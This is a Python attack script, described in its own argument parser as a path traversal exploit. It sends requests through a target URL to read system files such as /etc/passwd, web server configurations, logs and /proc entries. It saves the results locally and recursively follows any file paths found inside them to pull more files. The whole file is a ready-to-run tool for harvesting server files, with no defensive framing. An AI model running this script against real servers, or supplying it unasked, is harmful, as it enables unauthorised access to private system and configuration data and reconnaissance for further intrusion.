import requests
from requests.exceptions import HTTPError
import re
import sys
import os.path
import argparse

class HttpClient:
    def __init__(self, arguments):
        self.base_url = arguments.url
        self.session = requests.Session()

        for header in arguments.headers:
            key, value = header.split(": ", 1)
            self.session.headers[key] = value

    def request_file(self, path):
        url = self.base_url + path
        response = self.session.get(url, allow_redirects=False)
        if response.status_code != 200:
            raise FileNotFoundError(path)
        return response.content


def write_file(path, response):
    dest = "out" + path
    try:
        dest_dir = os.path.dirname(dest)
        os.makedirs(dest_dir)
    except FileExistsError:
        pass
    with open(dest, "wb") as fp:
        fp.write(response)


def find_files(content):
    matches = re.findall(b"/[a-z]+/[a-zA-Z0-9._/-]+", content)
    return {m.decode("ASCII") for m in matches if not m.startswith(b"/dev/")}


def spider(downloader):
    done = set()
    queue = [
        "/var/log/messages",
        "/etc/passwd",
        "/etc/motd",
        "/etc/apt/sources.list",
        "/etc/debian_version",
        "/etc/centos-release",
        "/var/cache/locate/locatedb",
        "/var/lib/mlocate/mlocate.db",
        "/etc/os-release",
        "/var/log/dmesg",
        "/etc/httpd/conf/httpd.conf",
        "/etc/httpd/conf.d/vhost.conf",
        "/etc/httpd/conf.d/ssl.conf",
        "/proc/sched_debug",
        "/proc/mounts",
        "/proc/net/tcp"
    ]

    while queue:
        path = queue.pop(0)
        try:
            print("  " + path, end='\r')
            response = downloader.request_file(path)
            if response:
                write_file(path, response)
                print("\u2713 " + path)
            else:
                print("0 " + path)

            files = find_files(response)
            remain = files - done
            queue.extend(remain)
        except (HTTPError, FileNotFoundError) as e:
            print("\u274c " + path)

        done.add(path)

    print("Done")


def parse_arguments():
    parser = argparse.ArgumentParser(description="Exploit path traversal")
    parser.add_argument("-H", "--header", dest="headers", action="append", help="Extra header (e.g. \"X-Forwarded-For: 127.0.0.1\")")
    parser.add_argument("url", help="URL to attack")
    return parser.parse_args()

if __name__ == "__main__":
    client = HttpClient(parse_arguments())
    spider(client)
